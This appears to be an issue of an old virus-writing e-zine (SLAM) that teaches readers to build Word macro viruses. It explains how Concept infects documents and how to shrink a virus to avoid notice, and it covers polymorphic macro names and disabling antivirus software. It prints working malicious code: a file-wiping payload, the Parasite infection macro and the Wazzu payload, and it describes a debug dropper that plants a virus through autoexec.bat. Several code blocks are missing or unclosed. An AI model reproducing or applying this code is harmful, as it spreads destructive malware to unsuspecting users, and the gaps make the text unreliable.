<h2><a name="p1">First info about macro virii</a></h2>
<p>A computer virus has lots of correspondences with biological virii (plural of virus). I will present a list with correspondences:</p>
<table border="1" cellspacing="0" cellpadding="0" summary="computer and biological viruses">
<tr><th>Computer virii</th><th>Biological virii</th></tr>
<tr><td>Infects other computers.</td><td>Infects other people.</td></tr>
<tr><td>Tries to destroy or do something that isn't nice ;) to others.</td><td>Makes you sick, and have consequents like throw up and stuff.</td></tr>
<tr><td>A virus waits with striking to get more computers infected.</td><td>A virus waits with striking to get more people infected.</td></tr>
<tr><td>Anti-virus progs helps you (NOT!!) with uninfecting you system. </td><td>There are medicines against almost all virii.</td></tr>
</table>
<p>There are lots of more comparisons with biological virii. Imagine... At the moment there are 2 main types of computer virii:</p>
<ol>
<li>Virii created in assembler (or other program languages, but most of the time in assembler). Created for Dos or sometimes for windows (Bizatch, etc.)</li>
<li>Virii created in MS-Word macro's (or other programs that have a good macro language) This sort will be the subject of this file.</li>
</ol>
<p>The second type are the newest virii and spread much more faster then the first type.</p>
<p>Macro virii (the second type) are created with Microsoft Word for Windows 6.0 or higher, you may think how can I create a virus with a MS-Word?</p>
<p>MS-Word has a build in macro language, a macro language is almost the same as a programmer language (such as C++, Pascal, etc.). The MS-WORD macro language is a simple version of Visual Basic (a programmers language. It's not very hard to learn, only I never found the perfect book about Word macros.</p>
<p>An assembler virus (type 1) attaches himself to an executable file such as .EXE and .COM, a Word macro virus (type 2) Doesn't attaches himself to .EXE or .COM files, but to .DOC files (the standard MS-Word type). You might think, how can a .DOC file with text be infected? See the following picture for more info.</p>
<pre>
  Normal Word Document (.DOC)
    +--------------------+
    | Text + text-format |
    +--------------------+

  Word Template (doesn't matter which extension, .DOT is often used)
    +------------------------------------------+
    | Text + text-format + macros + Word setup |
    +------------------------------------------+
</pre>
<p>Word virii are created in macros, so if you want to create a macro virus you must be sure that the file is saved as a Word template, because in Word templates you can save macros. But the only problem is that Word templates are almost always saved as .DOT. So we must change the FileSaveAs program that it will save Word templates as .DOC.</p>
<h3>What is a macro?</h3>
<p>A macro is a sort of a list of things that MS-Word will do automaticcly when the macro is run.</p>
<p>Maybe it's going a bit fast now, so we'll take it all over now, but if you almost fallen asleap because you already knew everything, go on with SLAM.003 and enjoy...</p>
<p>A summary of what we had till now:</p>
<ul>
<li>There are 2 types of virii:
<ul>
<li>Assembler virii, mostly for DOS</li>
<li>Winword virii, a new type of virii created with the macro language of Microsoft Word 6.0 or higher</li>
</ul></li>
<li>A Word virus is created in a macro, a list of instruction that MS-Word can do automatticly when a macro is run.</li>
<li>Word can only save macros in templates so you must make sure that Word saves every infected file as a template.</li>
</ul>
<p>Ok that was that. We have the basics of a macro virus here. Now we'll go on with a specific macro virus, the Concept macro virus. It was the first macro virus and is probably the most in the wild virus.</p>
<p>In Word you can see if there are any macros installed. You do this with selecting the Tools/Macros. You then get a dialogbox with the names of the macros installed in the Normal.dot, Normal.dot is the template where Word saves its settings in and stores his macros in that are created or copied to the Normal.dot. Because Word automaticly opens the Normal.dot when Word is opened we must make sure to copy the virus macros to the Normal.dot.</p>
<p>If you understand everything till here you can read on. Otherwise you may consider reading it again from the start.</p>
<p>We'll continue our journey in creating macro virii with looking at the first Word macro virus, Concept. Because Concept is just a simple Word macro virus we'll start with this virus. It's detected by all AV-progs I know about but you must learn to walk before you can do the Polka!</p>
<h3>The Concept Macro Virus</h3>
<p>Before you going to do all the stuff down here it's good to do the following things:</p>
<ul>
<li>Make a backup of the Normal.dot from \winword\template\normal.dot</li>
<li>It's handy to install the WordBasic help file too</li>
</ul>
<p>Concept uses 5 different macros to infect and spread. The names of these macros are:</p>
<dl>
<dt>AAAZAO</dt><dd>(a copy of the AutoOpen macro)</dd>
<dt>AAAZFS</dt><dd>(becomes the FileSaveAs macro)</dd>
<dt>AutoOpen</dt><dd>(is automaticly executed when doc is opened)</dd>
<dt>FileSaveAs</dt><dd>(changes the fileSaveAs dialog so it will save as a template, but with a .doc extension)</dd>
<dt>PayLoad</dt><dd>(is the infection marker, this macro doesn't do anything, it's just for fun)</dd>
</dl>
<p>In word macro virii the following happens when anyone gets infected:</p>
<ol>
<li>You open an infected template (document)</li>
<li>The AutoOpen macro in the infected template (document) copies all the virus macros from the template (document) to the Normal.dot</li>
<li>The virus macros changes the FileSaveAs dialog so that it will save every (normal) document you want to save but changes it into a template and saves the macros of the virus in the document</li>
</ol>
<p>This happens with almost every macro virii. There are exclusions, but I will explain these in later files.</p>
<p>Back to Concept.</p>
<p>The virus uses 5 macros, but if you look in an infected document (not the Normal.dot), with Tools/Macros you will see only 4. You might think: How the fuck is that possible??? It's not very hard to explain: It's quite logical. If you use an infected document (not the Normal.dot) you'll see the 4 macros:</p>
<ul>
<li>AAAZAO</li>
<li>AAAZFS</li>
<li>AutoOpen</li>
<li>PayLoad</li>
</ul>
<p>And if you look at an infected Normal.dot you'll see:</p>
<ul>
<li>AAAZAO</li>
<li>AAAZFS</li>
<li>FileSaveAs</li>
<li>PayLoad</li>
</ul>
<p>You see that there isn't any AutoOpen macro in the Normal.dot. That's because it isn't nessecary, because nobody opens his Normal.dot manually. But if it's opened if you start Word the AutoOpen macro won't run automaticly. We'll come to this later. But in the infected document the AutoOpen macro is probably the most important macro. Because it does the actual infection of the Normal.dot. I'll show you later how the macro works. The PayLoad macro in the infected document is the same as in the infected Normal.dot and only contains a message: "That's enough to prove my point" It further has no use. The AAAZAO is a copy of the AutoOpen macro and the AAAZFS macro is a copy of the FileSaveAs macro. The use of these macros are explained in the drawing down here.</p>
<p>The macros that are copied to the Normal.dot when AutoOpen is executed</p>
<pre>
+--Infected document---+
| AAAZAO --------------+--------+
| AAAZFS --------------+-----+  |
| AutoOpen             |     |  |
| PayLoad -------------+--+  |  |
+----------------------+  |  |  |
                          |  |  |
+--Normal.dot----------+  |  |  |
| PayLoad &lt;------------+--+  |  |
| FileSaveAs &lt;---------+-----+  |
| AAAZFS &lt;-------------+--------+
| AAAZAO &lt;-------------+--------+
+----------------------+
</pre>
<p>You saw that AAAZFS is copied to AAAZFS and to FileSaveAs and AutoOpen was not. That's because it is running. You cannot copy any macro that is running. That's why FileSaveAs isn't copied when saving a document (and infect the document) because FileSaveAs is running. In stead of FileSaveAs, AAAZFS is copied. AAAZFS has the same contents as FileSaveAs. As you will see later.</p>
<p>Because AutoOpen isn't copied to the Normal.dot you must have another macro that has the same contents as the AutoOpen macro to infect other documents that aren't infected yet, because the infected document must have an AutoOpen macro in it to infect other computers. Got it? Here's another drawing to show you what happens if you save an uninfected document, with the FileSaveAs macro.</p>
<p>The macros that are copied to the uninfected document when FileSaveAs is executed.</p>
<pre>
+--Normal.dot----------+
| AAAZAO --------------+--------+
| AAAZFS --------------+-----+  |
| FileSaveAs           |     |  |
| PayLoad -------------+--+  |  |
+----------------------+  |  |  |
                          |  |  |
+--Uninfected document-+  |  |  |
| PayLoad &lt;------------+--+  |  |
| AAAZFS &lt;-------------+-----+  |
| AutoOpen &lt;-----------+--------+
| AAAZAO &lt;-------------+--------+
+----------------------+
</pre>
<p>I hope you got it. Now the final thing before we going to see the macros and their contents of the Concept macro virus.</p>
<p>Every virus must have a see-if-already-infected-thing in it. Because if it tries to infect a file for the second time you will see all kind off strange error messages. This counts for assembler virii and ofcourse for Word macro virii.</p>
<h3>Source Code</h3>
<p>This is the source code of the macro virus Concept, it was the first macro virus created ever. After the source I'll explain what it excactly does. Everything behind an " ' " are comments by me.</p>

<p>Don't quit now if you don't understand a thing of it, most of you will not understand it right now. I will discuss the macros now. You probably have seen that the macros FileSaveAs and AAAZFS are the same. The macros AutoOpen and AAAZAO are the same to. It's quite logical because the AAAZFS gets copied to the FileSaveAs and the AAAZAO is copied to the AutoOpen macro. So because of the two same macros I will only discuss two macros with you, the FileSaveAs and AutoOpen, more is not neccesary. If your Normal.dot has the Concept macros you can easily watch them by clicking Tools/Macro---->"choose macro you want to view" and click Edit</p>
<p>Here follows the macros AutoOpen and FileSaveAs again only now with more explanation, I hope you get it now.</p>

<p>The Macro virus Concept is included with this SLAM issue in the file Concept.zip</p>
<p>Enjoy creating your first macro virus and learn from the WordBasic help file and books. You can read on with the mag if you want but it's probably better if you first learn something more about the Word macro language WordBasic.</p>
<h2><a name="p2">How to optimize your macro virii</a></h2>
<p>Ok, this one may not be very long but I think it's effective enough to put it in here.</p>
<p>As with every sort of virus there is a rule that if something is smaller it will go faster. With macro virii it doesn't really matter how fast the virus works because when you work on a Pentium 166 with a load of memory you will not notice the virus is even active, but there are other reasons to make your virus smaller. For instance, If your virus is 10k big and it infects a journalists network, and all the journalists together will create 250 documents in a day I'm sure somebody will notice that in 10 days the harddisk space is increased with 25 megabyte, so if you can make your virus 9k big the lost harddisk space in 10 days is only 22,5 megabytes. 2,5 megabytes with just 1k decreasement.</p>
<p>I hope you get the point, now I will give you a couple things to decrease your virus length with.</p>
<p>Never put any comments in the actual virus, I mean, don't put any comments in the virus you will spread. If you put a virus in a magazine or something, it's better to put comments in it.</p>
<p>Also, use as much strings as possible. I've tested it with a simple test: Create an empty template, and create a macro in that template. Now delete the Sub Main and End Sub commands and type a line like this: 'Welcome to the SLAM magazine issue 1, the Document X' Then select the line and use copy and paste to copy the line for about 50 times. When that's done select all the 50 lines and use the edit-->copy command. Then save the template with the macro as 'Test1.dot'.</p>
<p>Then create a second empty template and also create a macro in that template and delete the Sub Main and End Sub commands. Then paste the 50 lines to the empty macro. After that use the find replace command and type at find: Welcome to the SLAM magazine issue 1, the Document X and type at replace: A$ Check to see if every line is changed in A$. then type this at the top of the macro: A$ = "Welcome to the SLAM magazine issue 1, the Document X" And finally save the template as Test2.dot.</p>
<p>Now go to dos and check the length of both files. See any differences?</p>
<p>And don't use long labels, see the following example:</p>
<p>In stead of using this:</p>
<pre class="source">
-----------------------------------------------------------
Sub Main

CheckNumber = 0
Check_CheckNumber:
If CheckNumber = 5 then goto CheckNumber_is_5 else goto Checknumber_is_not_5

CheckNumber_is_not_5:
CheckNumber = CheckNumber + 1
goto Check_Checknumber

CheckNumber_is_5:
MsgBox "CheckNumber is 5", "Finished"

End Main
-----------------------------------------------------------
</pre>
<p>You could use this:</p>
<pre class="source">
-----------------------------------------------------------
Sub Main

C = 0
F:
If C = 5 then goto A else goto B

B:
C = C + 1
goto F

A:
MsgBox "CheckNumber is 5", "Finished"

End Main
-----------------------------------------------------------
</pre>
<p>And with a bit thinking :) you could do this:</p>
<pre class="source">
-----------------------------------------------------------
Sub Main

C = 0

B:
C = C + 1

If C = 5 then goto A
goto B

A:
MsgBox "CheckNumber is 5", "Finished"

End Main
-----------------------------------------------------------
</pre>
<p>You got it now? Ok, it won't make your virus more readable with it but it's smaller. And what the fuck do you care if some AV-pussy can't understand it :)</p>
<p>I think you can make up other things to decrease the size of your virus. Be creative.....</p>
<h2><a name="p3">Payloads in macro virii</a></h2>
<p>This file is about payloads. Payloads are things a virus does on a special time. It's best if you not activate the payload on the first infection because the user then knows that he has a virus. Many virii look for the date and time to deliver the payload, or they can watch how many files they already infected on that computer.</p>
<p>For example: A virus gets into your computer and you don't notice it. When the virus infected the 100th file the virus delivers the payload, your (precious) hard disk is overwritten.</p>
<p>This was just an example of a payload, if you gonna write a virus, be original!</p>
<p>But we're going to talk about payloads in macro virii so lets start. A macro virus will most of the time look at the date for delivering the payload. We'll give a couple examples of payloads in existing macro virii.</p>
<h3>The payload in the Atom macro virii</h3>
<pre class="source">
----------------------------------------------------------------
Sub MAIN
On Error Goto KillError
If Day(Now()) = 13 And Month(Now() = 12) Then
        Kill "*.*"
End If
KillError:
End Sub
----------------------------------------------------------------
</pre>
<p>As you can see it will check if the day is the 13th of the month 12 (december), and if it's the 12th of december it will delete (kill) *.*.</p>
<p>An other example of a payload is the following:</p>
<pre class="source">
'Payload macro from the concept virus

----------------------------------------------------------------
Sub MAIN
        REM That's enough to prove my point
End Sub
----------------------------------------------------------------
</pre>
<p>This one does no harm and only contains a text string. The name of the macro is payload and concept checks for this macro to see if he is already installed (infected).</p>
<p>Down here, again another payload, this time from the Wazzu virus:</p>
<pre class="source">
----------------------------------------------------------------
If Rnd() &lt; 0.25 Then
        RndWord
        Insert "wazzu "
        StartOfDocument
End If
----------------------------------------------------------------
</pre>
<p>The above piece of a macro generates a random number, and if the number is lower then 0.25 it will put the word Wazzu at the begin of the document.</p>
<p>The next one is from the Parasite 1.0 macro virus:</p>
<pre class="source">
----------------------------------------------------------------
Sub MAIN
n = Day(Now())
If n = 16 Then Goto y
If n &lt; 16 Then Goto n
If n > 16 Then Goto n
y:
EditReplace .Find = ".", .Replace = ",", .Direction = 0, .MatchCase = 0, .WholeWord = 1,
               .PatternMatch = 0, .SoundsLike = 0, .ReplaceAll, .Format = 0,
                       .Wrap = 1, .FindAllWordForms = 0
EditReplace .Find = "a", .Replace = "e", .Direction = 0, .MatchCase = 0, .WholeWord = 1,
               .PatternMatch = 0, .SoundsLike = 0, .ReplaceAll, .Format = 0,
                       .Wrap = 1, .FindAllWordForms = 0
n:
EditReplace .Find = "and", .Replace = "not", .Direction = 0, .MatchCase = 0, .WholeWord = 1,
               .PatternMatch = 0, .SoundsLike = 0, .ReplaceAll, .Format = 0,
                       .Wrap = 1, .FindAllWordForms = 0
sMe$ = FileName$()
FileSaveAs .Name = sMe$, .Format = 1
sTMacro$ = sMe$ + ":AutoOpen"
MacroCopy "Global:PARA", sTMacro$, 4
sTMacro$ = sMe$ + ":PARA"
MacroCopy "Global:PARA", sTMacro$, 4
sTMacro$ = sMe$ + ":SITE"
MacroCopy "Global:SITE", sTMacro$, 3
sTMacro$ = sMe$ + ":PayLoad"
MacroCopy "Global:PayLoad", sTMacro$, 1
sTMacro$ = sMe$ + ":K"
MacroCopy "Global:AutoExec", sTMacro$, 5
sTMacro$ = sMe$ + ":a678"
MacroCopy "Global:AutoOpen", sTMacro$, 6
sTMacro$ = sMe$ + ":I8U9Y13"
MacroCopy "Global:AutoExit", sTMacro$, 7
FileSaveAs .Name = sMe$, .Format = 1

End Sub
----------------------------------------------------------------
</pre>
<p>This is the whole FileSaveAs macro from Parasite 1.0 it first looks for the date, and checks if the day is 16. And if it is the 16th the virus will change all "." to "," and all "a" to "e" and all "and" to "not". The last thing (and --> not) the virus does with every save of a document. (I personally like this one ;)</p>
<p>And finally I'll show you, what I call, the debug payloads. Look at the following example. If you know debug the following will be familiar.</p>

<p>The above is a piece of a Nemesis macro and it opens debug to create a file (debugger.exe) containing the Neurobasher.b virus. The numbers are the hex codes of the Neurobasher.b virus. Then a file called "c:\dos\exec.bat" is created and it contains everything behind the "print #1" until "close #1" is found. After that's done the virus will change the attributes of "c:\autoexec.bat" to editable (not readonly).</p>
<p>And finally the virus will change to the directory "c:\dos" and executes the "exec.bat" file that was created earlier, after that the virus will change to the "c:" directory. So the next time you start your computer the Neurobasher.b virus will be loaded. Have fun trying this out ;-)</p>
<h2><a name="p4">Polymorphism in macro virii</a></h2>
<p>You maybe already heared something about polymorphism in macro virii. The first macro virus that uses this technique was the Outlaw virus. The way it is polymorphic is that it changes it's macro names every infection and stores them (the macro names) in win.ini. If Word is restarted, it reads the names of the macro from win.ini. To use them in your macros you need to read them and set them into strings like name1$, name2$, etc. The names that are generated are just a charachter + number, something like A326 or maybe RT898763. The reason that it uses characters plus numbers is because Word can only use macros that begin with a character. After the character there can be numbers too. That's done because of the fact that numbers are easy to generate in Word. Just use some random function to generate a random number. But if Word generates a number there is always an open space before the number because that is used for making the number negative. i.e. if the generated number is "12345" it actually is " 12345". There is a function that deletes that open space. Its Ltrim. You will see how it works in the example.</p>
<p>I hope you get it, and else don't worry but read the file again. And now , the moment you've all been waiting for :) the code for making a polymorfic macro virus.</p>
<p>This is an example of the code the Outlaw virus uses.</p>

<p>You see this isn't as complicated as you may have thought. The only complicated thing is the saving of the macro names in the win.ini. About that, if you want to use the generated macro names in another macro, you must read the macro names from win.ini. This is done by typing: UZ$ = GetProfileString$("Intl", "Name") It's best to set this at the top of the macro. But if the virus contains more then two macros (Outlaw does) you must set another line in your macro. Just below the UZ$ = getprof... you type: ZU$ = GetProfileString$("Intl", "Name2") ZUZ$ = GetProfileString$("Intl", "Name3") Only, be awrare if you didn't use Intl and Name1, Name2, etc. you must change the names. But now UZ$, ZU$ and ZUZ$ contains the macro names. So you could use something like:</p>
<pre class="source">
infDoc$ = FileName()
Macrocopy "Global:" + UZ$, InfDoc$ + ":" + generated name
</pre>
<p>This is just simple polymorfism. What you can do to improve your polymorfism is:</p>
<ul>
<li>Making more generatable names</li>
<li>Make sure that a name doesn't come twice</li>
<li>Do not use the time to generate the first character</li>
</ul>
<p>Making more generatable names is quite easy, because you could just make the number higher. For example:</p>
<p>Instead of using this:</p>
<pre class="source">
One = 7369
Two = 9291
Num = Int(Rnd() * (Two - One) + One)
A$ = Str$(Num)
A$ = LTrim$(A$)
</pre>
<p>You could use this:</p>
<pre class="source">
One = 1000000
Two = 9999999
Num = Int(Rnd() * (Two - One) + One)
A$ = Str$(Num)
A$ = LTrim$(A$)
</pre>
<p>Real simple, isn't it?</p>
<p>Now the second thing. How to make sure that a generated name doesn't comes twice. You could use:</p>
<pre class="source">
One = 1000
Two = 2000
Num = Int(Rnd() * (Two - One) + One)
A$ = Str$(Num)
A$ = LTrim$(A$)
</pre>
<p>And for the next macro:</p>
<pre class="source">
One = 2001
Two = 3000
Num = Int(Rnd() * (Two - One) + One)
A$ = Str$(Num)
A$ = LTrim$(A$)
</pre>
<p>And so on...</p>
<p>See? But instead of using the numbers you could also use the characters: You could use:</p>
<pre class="source">

<p>So easy i'm falling asleap, tell me something i cannot think by myself!</p>
<p>Ok, i'll try... and now how not to use the time for generating the first character.</p>
<p>Instead of using:</p>
<pre class="source">

A$ = Str$(Num)
A$ = LTrim$(A$)

<p>use this:</p>
<pre class="source">

<h2><a name="p5">Anti-anti-virus (retro) in macro virii</a></h2>
<p>It's quite simple to attack Non-Resident Anti-virus software, just delete or rename a specific file and your AV progi won't work anymore. Most of the time the user will reinstall the product so if you put a line in autoexec.bat that deletes or renames the file if it exists again the technique is quite useful. But I didn't discovered yet how to avoid the memory-resident AV software.</p>
<p>Here is some example I used in my Puritan (1) virus. The Puritan (1) virus is just a bad rip off concept virus, but with retro techniques and simple stealth, but eh don't blame me for having two days time to create a virus and a new technique so the virus contains some bugs, but the virus will be continued. There's the (1) for. Here is a piece of the Puritan (1) virus to demonstrate a new technique to attack non-resident AV software.</p>
